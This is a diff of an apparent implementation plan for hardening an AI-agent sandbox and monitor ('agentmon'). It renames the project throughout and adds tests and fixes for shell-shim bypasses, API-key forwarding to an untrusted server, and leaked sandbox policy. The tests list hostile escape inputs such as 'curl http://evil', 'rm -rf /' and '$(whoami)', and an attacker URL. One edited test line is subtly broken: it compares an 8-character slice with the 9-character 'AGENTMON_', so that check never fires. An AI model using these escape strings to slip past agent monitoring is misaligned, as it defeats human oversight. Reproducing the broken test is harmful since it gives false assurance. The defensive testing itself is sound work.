@@ -22,11 +22,11 @@
 - `internal/platform/policy_adapter.go` — fail-closed nil-engine returns (H5).
 - `internal/platform/fuse/ops.go` — `checkPolicy` fail-closed nil-engine (H5).
 - `internal/platform/linux/filesystem.go` — `wrapPolicyEngine` doc/no-nil-allow note (H5).
-- `cmd/agentsh-shell-shim/main.go` — `containsCompoundOperator` + `isAgentshCommand` (C1); `serverHTTPBaseURL`/`AGENTSH_SERVER` trust (H17).
+- `cmd/agentmon-shell-shim/main.go` — `containsCompoundOperator` + `isAgentmonCommand` (C1); `serverHTTPBaseURL`/`AGENTMON_SERVER` trust (H17).
 - `internal/platform/wsl2/sandbox.go`, `internal/platform/lima/sandbox.go` — `Execute` default branch argv (C3).
 - `internal/pkgcheck/orchestrator.go` — treat `Metadata.Partial` as `ProviderError` (C4).
 - `internal/policy/engine.go` — `CheckFile` read default (H16); opaque-`sh -c` gate (M48).
-- `cmd/agentsh-unixwrap/main.go`, `cmd/agentsh-macwrap/main.go` — scrub `AGENTSH_*` env before `syscall.Exec` (M58).
+- `cmd/agentmon-unixwrap/main.go`, `cmd/agentmon-macwrap/main.go` — scrub `AGENTMON_*` env before `syscall.Exec` (M58).
 - `internal/platform/darwin/sandbox.go` (+ `internal/api/sandbox_compile_darwin.go`) — darwin-SBPL investigation + fix.
 - Test files (one per task, co-located with the package under test).
 
@@ -132,7 +132,7 @@ package fuse
 import (
 	"testing"
 
-	"github.com/agentsh/agentsh/internal/platform"
+	"github.com/diffsec/agentmon/internal/platform"
 )
 
 // TestFuseFS_CheckPolicy_NilEngineDenies verifies FUSE denies when no
@@ -167,8 +167,8 @@ DecisionDeny so a missing enforcement component cannot grant access."
 ### Task 2: C1 — Shell-shim bypass via `&` / process substitution
 
 **Files:**
-- Modify: `cmd/agentsh-shell-shim/main.go:415-447` (`containsCompoundOperator`)
-- Test: `cmd/agentsh-shell-shim/main_test.go` (append)
+- Modify: `cmd/agentmon-shell-shim/main.go:415-447` (`containsCompoundOperator`)
+- Test: `cmd/agentmon-shell-shim/main_test.go` (append)
 
 **Interfaces:**
 - Consumes: none new.
@@ -176,7 +176,7 @@ DecisionDeny so a missing enforcement component cannot grant access."
 
 - [ ] **Step 1: Write the failing test**
 
-Append to `cmd/agentsh-shell-shim/main_test.go`:
+Append to `cmd/agentmon-shell-shim/main_test.go`:
 
 ```go
 func TestContainsCompoundOperator_BackgroundAndProcessSubstitution(t *testing.T) {
@@ -185,15 +185,15 @@ func TestContainsCompoundOperator_BackgroundAndProcessSubstitution(t *testing.T)
 	}
 	// These MUST be detected as compound (escape vectors).
 	escapeCases := []string{
-		"agentsh --version & curl http://evil",
-		"agentsh detect & sh /tmp/e",
-		"agentsh x > >(tee log)",   // process substitution >
-		"agentsh x < <(cat secret)", // process substitution <
-		"agentsh detect; rm -rf /",
-		"agentsh detect && curl evil",
-		"agentsh detect || curl evil",
-		"agentsh detect $(whoami)",
-		"agentsh detect | curl evil",
+		"agentmon --version & curl http://evil",
+		"agentmon detect & sh /tmp/e",
+		"agentmon x > >(tee log)",   // process substitution >
+		"agentmon x < <(cat secret)", // process substitution <
+		"agentmon detect; rm -rf /",
+		"agentmon detect && curl evil",
+		"agentmon detect || curl evil",
+		"agentmon detect $(whoami)",
+		"agentmon detect | curl evil",
 	}
 	for _, in := range escapeCases {
 		if !containsCompoundOperator(in) {
@@ -202,11 +202,11 @@ func TestContainsCompoundOperator_BackgroundAndProcessSubstitution(t *testing.T)
 	}
 	// Legitimate single commands / redirects MUST still bypass.
 	safeCases := []string{
-		"agentsh detect",
-		"agentsh exec foo bar",
-		"agentsh detect 2>&1",   // fd redirect, not background
-		"agentsh detect > out",  // redirection, not process-sub
-		"agentsh detect 2>err",
+		"agentmon detect",
+		"agentmon exec foo bar",
+		"agentmon detect 2>&1",   // fd redirect, not background
+		"agentmon detect > out",  // redirection, not process-sub
+		"agentmon detect 2>err",
 	}
 	for _, in := range safeCases {
 		if containsCompoundOperator(in) {
@@ -218,12 +218,12 @@ func TestContainsCompoundOperator_BackgroundAndProcessSubstitution(t *testing.T)
 
 - [ ] **Step 2: Run test to verify it fails**
 
-Run: `go test ./cmd/agentsh-shell-shim/ -run TestContainsCompoundOperator_BackgroundAndProcessSubstitution -v`
-Expected: FAIL — `agentsh --version & curl http://evil` returns false (standalone `&` not detected).
+Run: `go test ./cmd/agentmon-shell-shim/ -run TestContainsCompoundOperator_BackgroundAndProcessSubstitution -v`
+Expected: FAIL — `agentmon --version & curl http://evil` returns false (standalone `&` not detected).
 
 - [ ] **Step 3: Implement — detect standalone `&` and process substitution**
 
-Replace `containsCompoundOperator` in `cmd/agentsh-shell-shim/main.go`:
+Replace `containsCompoundOperator` in `cmd/agentmon-shell-shim/main.go`:
 
 ```go
 // containsCompoundOperator checks if a shell command string contains operators
@@ -293,25 +293,25 @@ func containsCompoundOperator(s string) bool {
 
 - [ ] **Step 4: Run test to verify it passes**
 
-Run: `go test ./cmd/agentsh-shell-shim/ -run TestContainsCompoundOperator_BackgroundAndProcessSubstitution -v`
+Run: `go test ./cmd/agentmon-shell-shim/ -run TestContainsCompoundOperator_BackgroundAndProcessSubstitution -v`
 Expected: PASS.
 
 - [ ] **Step 5: Run the full shim test suite to catch regressions**
 
-Run: `go test ./cmd/agentsh-shell-shim/ -v`
+Run: `go test ./cmd/agentmon-shell-shim/ -v`
 Expected: PASS (no previously-passing bypass test broke).
 
 - [ ] **Step 6: Vet, build, commit**
 
 ```bash
-go vet ./cmd/agentsh-shell-shim/
-go build ./cmd/agentsh-shell-shim/
-git add cmd/agentsh-shell-shim/main.go cmd/agentsh-shell-shim/main_test.go
+go vet ./cmd/agentmon-shell-shim/
+go build ./cmd/agentmon-shell-shim/
+git add cmd/agentmon-shell-shim/main.go cmd/agentmon-shell-shim/main_test.go
 git commit -m "fix(shim): detect standalone & and process substitution as compound (C1)
 
-The agentsh-CLI deadlock bypass used an incomplete operator allowlist: a
+The agentmon-CLI deadlock bypass used an incomplete operator allowlist: a
 standalone '&' (background) or '>(…)'/'<(…)' (process substitution) was
-not detected, so 'agentsh --version & curl evil' bypassed all enforcement.
+not detected, so 'agentmon --version & curl evil' bypassed all enforcement.
 Make containsCompoundOperator reject these so the bypass fails closed."
 ```
 
@@ -629,7 +629,7 @@ func TestCheckFile_SensitiveReadsDeniedByDefault(t *testing.T) {
 }
 ```
 
-> NOTE: `Decision` has no `.Allow()` method; compare `dec.EffectiveDecision == types.DecisionAllow` directly (import `github.com/agentsh/agentsh/internal/types`, as existing policy tests do).
+> NOTE: `Decision` has no `.Allow()` method; compare `dec.EffectiveDecision == types.DecisionAllow` directly (import `github.com/diffsec/agentmon/internal/types`, as existing policy tests do).
 
 - [ ] **Step 2: Run test to verify it fails**
 
@@ -731,19 +731,19 @@ rules still override."
 
 ---
 
-### Task 6: H17 — `AGENTSH_SERVER` exfiltrates API key / server-influenced exec
+### Task 6: H17 — `AGENTMON_SERVER` exfiltrates API key / server-influenced exec
 
 **Files:**
-- Modify: `cmd/agentsh-shell-shim/main.go:643-648` (`serverHTTPBaseURL`) + the `kernelinstall.Install` call site (~124)
-- Test: `cmd/agentsh-shell-shim/main_test.go` (append)
+- Modify: `cmd/agentmon-shell-shim/main.go:643-648` (`serverHTTPBaseURL`) + the `kernelinstall.Install` call site (~124)
+- Test: `cmd/agentmon-shell-shim/main_test.go` (append)
 
 **Interfaces:**
 - Consumes: `serverAddrFromEnv` (existing validation), `os.Getenv`.
-- Produces: `serverHTTPBaseURL()` returns the trusted local URL or an error-able value when `AGENTSH_SERVER` is a non-loopback host.
+- Produces: `serverHTTPBaseURL()` returns the trusted local URL or an error-able value when `AGENTMON_SERVER` is a non-loopback host.
 
 - [ ] **Step 1: Write the failing test**
 
-Append to `cmd/agentsh-shell-shim/main_test.go`:
+Append to `cmd/agentmon-shell-shim/main_test.go`:
 
 ```go
 func TestServerHTTPBaseURL_RejectsNonLoopback(t *testing.T) {
@@ -766,7 +766,7 @@ func TestServerHTTPBaseURL_RejectsNonLoopback(t *testing.T) {
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
-			t.Setenv("AGENTSH_SERVER", c.env)
+			t.Setenv("AGENTMON_SERVER", c.env)
 			got := serverHTTPBaseURL()
 			if c.wantOK {
 				return
@@ -774,7 +774,7 @@ func TestServerHTTPBaseURL_RejectsNonLoopback(t *testing.T) {
 			// Refusal = must not echo the attacker URL back; must fall back to
 			// the trusted local default.
 			if got == c.env {
-				t.Fatalf("serverHTTPBaseURL() echoed untrusted AGENTSH_SERVER %q (API key would be forwarded there)", c.env)
+				t.Fatalf("serverHTTPBaseURL() echoed untrusted AGENTMON_SERVER %q (API key would be forwarded there)", c.env)
 			}
 		})
 	}
@@ -783,29 +783,29 @@ func TestServerHTTPBaseURL_RejectsNonLoopback(t *testing.T) {
 
 - [ ] **Step 2: Run test to verify it fails**
 
-Run: `go test ./cmd/agentsh-shell-shim/ -run TestServerHTTPBaseURL_RejectsNonLoopback -v`
+Run: `go test ./cmd/agentmon-shell-shim/ -run TestServerHTTPBaseURL_RejectsNonLoopback -v`
 Expected: FAIL — `serverHTTPBaseURL()` echoes `http://evil.example.com` back.
 
-- [ ] **Step 3: Implement — only trust loopback/localhost `AGENTSH_SERVER`**
+- [ ] **Step 3: Implement — only trust loopback/localhost `AGENTMON_SERVER`**
 
-Replace `serverHTTPBaseURL` in `cmd/agentsh-shell-shim/main.go`:
+Replace `serverHTTPBaseURL` in `cmd/agentmon-shell-shim/main.go`:
 
 ```go
 const defaultServerHTTPURL = "http://127.0.0.1:18080"
 
-// serverHTTPBaseURL returns the agentsh server URL for kernelinstall.Install.
-// The shim is the untrusted user's login shell, so AGENTSH_SERVER is trusted
+// serverHTTPBaseURL returns the agentmon server URL for kernelinstall.Install.
+// The shim is the untrusted user's login shell, so AGENTMON_SERVER is trusted
 // ONLY when it points at a loopback address (127.0.0.0/8, ::1) or "localhost".
 // Any other host is refused (falls back to the local default) so an attacker
-// cannot redirect wrap-init traffic — and the AGENTSH_API_KEY — to an external
+// cannot redirect wrap-init traffic — and the AGENTMON_API_KEY — to an external
 // endpoint whose response controls the exec'd wrapper binary.
 func serverHTTPBaseURL() string {
-	v := strings.TrimSpace(os.Getenv("AGENTSH_SERVER"))
+	v := strings.TrimSpace(os.Getenv("AGENTMON_SERVER"))
 	if v == "" {
 		return defaultServerHTTPURL
 	}
 	if !isLoopbackServerURL(v) {
-		debugLog("serverHTTPBaseURL: rejecting non-loopback AGENTSH_SERVER %q; using %s", v, defaultServerHTTPURL)
+		debugLog("serverHTTPBaseURL: rejecting non-loopback AGENTMON_SERVER %q; using %s", v, defaultServerHTTPURL)
 		return defaultServerHTTPURL
 	}
 	return v
@@ -826,25 +826,25 @@ func isLoopbackServerURL(raw string) bool {
 }
 ```
 
-> NOTE: ensure `net` and `net/url` are imported in `main.go` (`serverAddrFromEnv` already uses them, so they should be present — confirm with `grep -n "\"net\"\|net/url" cmd/agentsh-shell-shim/main.go`).
+> NOTE: ensure `net` and `net/url` are imported in `main.go` (`serverAddrFromEnv` already uses them, so they should be present — confirm with `grep -n "\"net\"\|net/url" cmd/agentmon-shell-shim/main.go`).
 
 - [ ] **Step 4: Run test to verify it passes**
 
-Run: `go test ./cmd/agentsh-shell-shim/ -run TestServerHTTPBaseURL_RejectsNonLoopback -v`
+Run: `go test ./cmd/agentmon-shell-shim/ -run TestServerHTTPBaseURL_RejectsNonLoopback -v`
 Expected: PASS.
 
 - [ ] **Step 5: Run full shim suite + vet/build/commit**
 
 ```bash
-go test ./cmd/agentsh-shell-shim/ -v
-go vet ./cmd/agentsh-shell-shim/
-go build ./cmd/agentsh-shell-shim/
-git add cmd/agentsh-shell-shim/main.go cmd/agentsh-shell-shim/main_test.go
-git commit -m "fix(shim): only trust loopback AGENTSH_SERVER, never forward API key off-host (H17)
+go test ./cmd/agentmon-shell-shim/ -v
+go vet ./cmd/agentmon-shell-shim/
+go build ./cmd/agentmon-shell-shim/
+git add cmd/agentmon-shell-shim/main.go cmd/agentmon-shell-shim/main_test.go
+git commit -m "fix(shim): only trust loopback AGENTMON_SERVER, never forward API key off-host (H17)
 
-serverHTTPBaseURL echoed AGENTSH_SERVER verbatim into kernelinstall.Install,
-which posts the AGENTSH_API_KEY to it and execs a server-returned binary.
-The shim is the user's login shell, so AGENTSH_SERVER is untrusted: only
+serverHTTPBaseURL echoed AGENTMON_SERVER verbatim into kernelinstall.Install,
+which posts the AGENTMON_API_KEY to it and execs a server-returned binary.
+The shim is the user's login shell, so AGENTMON_SERVER is untrusted: only
 accept loopback/localhost, else fall back to the local default."
 ```
 
@@ -917,7 +917,7 @@ func TestCheckCommand_OpaqueShellC_AllowOnlyPolicy_WithExecve(t *testing.T) {
 }
 ```
 
-> NOTE: `CheckCommandWithExecve(command, args, execveEnforcementActive, opaqueMode)` is the real entry point (confirmed at `internal/policy/engine.go:660`). `ShellCOpaqueEnforce` is the package const (`engine.go:628`). `Decision` has no `.Allow()` method; compare `dec.EffectiveDecision == types.DecisionAllow` (import `github.com/agentsh/agentsh/internal/types`).
+> NOTE: `CheckCommandWithExecve(command, args, execveEnforcementActive, opaqueMode)` is the real entry point (confirmed at `internal/policy/engine.go:660`). `ShellCOpaqueEnforce` is the package const (`engine.go:628`). `Decision` has no `.Allow()` method; compare `dec.EffectiveDecision == types.DecisionAllow` (import `github.com/diffsec/agentmon/internal/types`).
 
 - [ ] **Step 2: Run test to verify it fails**
 
@@ -980,20 +980,20 @@ binaries)."
 ---
 
 
-### Task 8: M58 — Scrub `AGENTSH_*` env before `syscall.Exec`
+### Task 8: M58 — Scrub `AGENTMON_*` env before `syscall.Exec`
 
 **Files:**
-- Modify: `cmd/agentsh-unixwrap/main.go` (add `scrubAgentshEnv()` + use it before `syscall.Exec` at ~259)
-- Modify: `cmd/agentsh-macwrap/main.go` (same, before `syscall.Exec` at ~72)
-- Test: `cmd/agentsh-unixwrap/main_test.go` (create), `cmd/agentsh-macwrap/main_test.go` (create)
+- Modify: `cmd/agentmon-unixwrap/main.go` (add `scrubAgentmonEnv()` + use it before `syscall.Exec` at ~259)
+- Modify: `cmd/agentmon-macwrap/main.go` (same, before `syscall.Exec` at ~72)
+- Test: `cmd/agentmon-unixwrap/main_test.go` (create), `cmd/agentmon-macwrap/main_test.go` (create)
 
 **Interfaces:**
 - Consumes: `os.Environ`.
-- Produces: `scrubAgentshEnv() []string` — returns an env slice with `AGENTSH_`-prefixed vars removed (except the documented allowlist, if any).
+- Produces: `scrubAgentmonEnv() []string` — returns an env slice with `AGENTMON_`-prefixed vars removed (except the documented allowlist, if any).
 
 - [ ] **Step 1: Write the failing test**
 
-`cmd/agentsh-unixwrap/main_test.go`:
+`cmd/agentmon-unixwrap/main_test.go`:
 
 ```go
 //go:build unix
@@ -1005,23 +1005,23 @@ import (
 	"testing"
 )
 
-func TestScrubAgentshEnv_RemovesInternalVars(t *testing.T) {
+func TestScrubAgentmonEnv_RemovesInternalVars(t *testing.T) {
 	// Simulate the inherited environment the wrapper receives.
 	env := []string{
 		"PATH=/usr/bin",
-		"AGENTSH_SECCOMP_CONFIG={\"rules\":[]}",
-		"AGENTSH_NOTIFY_SOCK_FD=5",
-		"AGENTSH_SANDBOX_CONFIG=secret-policy",
-		"AGENTSH_WRAPPER_LOG_FD=7",
+		"AGENTMON_SECCOMP_CONFIG={\"rules\":[]}",
+		"AGENTMON_NOTIFY_SOCK_FD=5",
+		"AGENTMON_SANDBOX_CONFIG=secret-policy",
+		"AGENTMON_WRAPPER_LOG_FD=7",
 		"HOME=/root",
 	}
-	got := scrubAgentshEnv(env)
+	got := scrubAgentmonEnv(env)
 	for _, kv := range got {
-		if len(kv) >= 8 && kv[:8] == "AGENTSH_" {
-			t.Errorf("scrubAgentshEnv left AGENTSH_* var: %q", kv)
+		if len(kv) >= 8 && kv[:8] == "AGENTMON_" {
+			t.Errorf("scrubAgentmonEnv left AGENTMON_* var: %q", kv)
 		}
 	}
-	// Non-AGENTSH vars survive.
+	// Non-AGENTMON vars survive.
 	foundPath := false
 	for _, kv := range got {
 		if kv == "PATH=/usr/bin" {
@@ -1029,17 +1029,17 @@ func TestScrubAgentshEnv_RemovesInternalVars(t *testing.T) {
 		}
 	}
 	if !foundPath {
-		t.Errorf("scrubAgentshEnv dropped non-AGENTSH var PATH")
+		t.Errorf("scrubAgentmonEnv dropped non-AGENTMON var PATH")
 	}
 }
 
 // Ensure os.Environ-based helper also strips when reading live env.
-func TestScrubAgentshEnv_FromOsEnviron(t *testing.T) {
-	t.Setenv("AGENTSH_TEST_VAR", "leaked")
-	got := scrubAgentshEnv(os.Environ())
+func TestScrubAgentmonEnv_FromOsEnviron(t *testing.T) {
+	t.Setenv("AGENTMON_TEST_VAR", "leaked")
+	got := scrubAgentmonEnv(os.Environ())
 	for _, kv := range got {
-		if kv == "AGENTSH_TEST_VAR=leaked" {
-			t.Errorf("AGENTSH_TEST_VAR survived scrub")
+		if kv == "AGENTMON_TEST_VAR=leaked" {
+			t.Errorf("AGENTMON_TEST_VAR survived scrub")
 		}
 	}
 }
@@ -1047,21 +1047,21 @@ func TestScrubAgentshEnv_FromOsEnviron(t *testing.T) {
 
 - [ ] **Step 2: Run test to verify it fails**
 
-Run: `go test ./cmd/agentsh-unixwrap/ -run TestScrubAgentshEnv -v`
-Expected: FAIL — `scrubAgentshEnv` undefined.
+Run: `go test ./cmd/agentmon-unixwrap/ -run TestScrubAgentmonEnv -v`
+Expected: FAIL — `scrubAgentmonEnv` undefined.
 
 - [ ] **Step 3: Implement — add the scrubber and use it at exec**
 
-In `cmd/agentsh-unixwrap/main.go`, add:
+In `cmd/agentmon-unixwrap/main.go`, add:
 
 ```go
-// scrubAgentshEnv returns env with AGENTSH_* internal variables removed so
+// scrubAgentmonEnv returns env with AGENTMON_* internal variables removed so
 // the sandboxed command cannot read the seccomp/sandbox policy or fd layout
-// from its own environment. Non-AGENTSH vars are preserved.
-func scrubAgentshEnv(env []string) []string {
+// from its own environment. Non-AGENTMON vars are preserved.
+func scrubAgentmonEnv(env []string) []string {
 	out := make([]string, 0, len(env))
 	for _, kv := range env {
-		if strings.HasPrefix(kv, "AGENTSH_") {
+		if strings.HasPrefix(kv, "AGENTMON_") {
 			continue
 		}
 		out = append(out, kv)
@@ -1073,43 +1073,43 @@ func scrubAgentshEnv(env []string) []string {
 Then change the exec site:
 
 ```go
-	if err := syscall.Exec(cmdPath, args, scrubAgentshEnv(os.Environ())); err != nil {
+	if err := syscall.Exec(cmdPath, args, scrubAgentmonEnv(os.Environ())); err != nil {
 		fatalf("exec %s failed: %v", cmd, err)
 	}
 ```
 
-> NOTE: if `AGENTSH_WRAPPER_LOG_FD` is deliberately unset earlier in `logging.go` via `os.Unsetenv`, the scrubber supersedes that — confirm no code reads an `AGENTSH_*` var after the scrub point (it shouldn't, since exec is terminal). Ensure `strings` is imported.
+> NOTE: if `AGENTMON_WRAPPER_LOG_FD` is deliberately unset earlier in `logging.go` via `os.Unsetenv`, the scrubber supersedes that — confirm no code reads an `AGENTMON_*` var after the scrub point (it shouldn't, since exec is terminal). Ensure `strings` is imported.
 
-Mirror in `cmd/agentsh-macwrap/main.go`:
+Mirror in `cmd/agentmon-macwrap/main.go`:
 
 ```go
-	if err := syscall.Exec(cmd, args, scrubAgentshEnv(os.Environ())); err != nil {
+	if err := syscall.Exec(cmd, args, scrubAgentmonEnv(os.Environ())); err != nil {
 		log.Fatalf("exec %s failed: %v", cmd, err)
 	}
 ```
 
-(`scrubAgentshEnv` must be defined in the macwrap package too, or moved to a shared internal package — simplest: define the identical small function in each `package main`. Avoid `os.Unsetenv` for the child since the child is a separate process image after `Exec`.)
+(`scrubAgentmonEnv` must be defined in the macwrap package too, or moved to a shared internal package — simplest: define the identical small function in each `package main`. Avoid `os.Unsetenv` for the child since the child is a separate process image after `Exec`.)
 
 - [ ] **Step 4: Run test to verify it passes**
 
-Run: `go test ./cmd/agentsh-unixwrap/ -run TestScrubAgentshEnv -v`
+Run: `go test ./cmd/agentmon-unixwrap/ -run TestScrubAgentmonEnv -v`
 Expected: PASS.
 
-Add the same test in `cmd/agentsh-macwrap/main_test.go` (`//go:build darwin`, identical body) and run `GOOS=darwin go test ./cmd/agentsh-macwrap/ -run TestScrubAgentshEnv -v` → PASS.
+Add the same test in `cmd/agentmon-macwrap/main_test.go` (`//go:build darwin`, identical body) and run `GOOS=darwin go test ./cmd/agentmon-macwrap/ -run TestScrubAgentmonEnv -v` → PASS.
 
 - [ ] **Step 5: Vet, build (all OSes), commit**
 
 ```bash
-go vet ./cmd/agentsh-unixwrap/ ./cmd/agentsh-macwrap/
+go vet ./cmd/agentmon-unixwrap/ ./cmd/agentmon-macwrap/
 GOOS=linux go build ./...
 GOOS=darwin go build ./...
-git add cmd/agentsh-unixwrap/main.go cmd/agentsh-unixwrap/main_test.go cmd/agentsh-macwrap/main.go cmd/agentsh-macwrap/main_test.go
-git commit -m "fix(wrap): scrub AGENTSH_* env before syscall.Exec (M58)
+git add cmd/agentmon-unixwrap/main.go cmd/agentmon-unixwrap/main_test.go cmd/agentmon-macwrap/main.go cmd/agentmon-macwrap/main_test.go
+git commit -m "fix(wrap): scrub AGENTMON_* env before syscall.Exec (M58)
 
 unixwrap/macwrap passed the full os.Environ() to the sandboxed command,
-leaking AGENTSH_SECCOMP_CONFIG/AGENTSH_SANDBOX_CONFIG (the exact policy +
+leaking AGENTMON_SECCOMP_CONFIG/AGENTMON_SANDBOX_CONFIG (the exact policy +
 fd layout) so a supervised process could enumerate its own restrictions.
-Scrub AGENTSH_* vars before exec."
+Scrub AGENTMON_* vars before exec."
 ```
 
 ---
@@ -1135,7 +1135,7 @@ grep -rn "CompileDarwinSandbox\|CompiledProfile\|generateSandboxProfile\|Sandbox
 
 Determine:
 1. Does any production code call `darwin.SandboxManager.Create` (which uses `generateSandboxProfile` → the permissive template)? (`darwin.Platform.Sandbox()` → `NewSandboxManager`.)
-2. Does production sandboxing instead go through `internal/api/sandbox_compile_darwin.go:21` (`CompileDarwinSandbox`) → `cfg.CompiledProfile` → `agentsh-macwrap` (`cmd/agentsh-macwrap/main.go:64` uses `cfg.CompiledProfile` if set)?
+2. Does production sandboxing instead go through `internal/api/sandbox_compile_darwin.go:21` (`CompileDarwinSandbox`) → `cfg.CompiledProfile` → `agentmon-macwrap` (`cmd/agentmon-macwrap/main.go:64` uses `cfg.CompiledProfile` if set)?
 
 Record the answer in the commit message. **Decision rule:**
 - If `SandboxManager.Create` (permissive template) is reachable from a real agent-exec path → **fix** (Step 2).
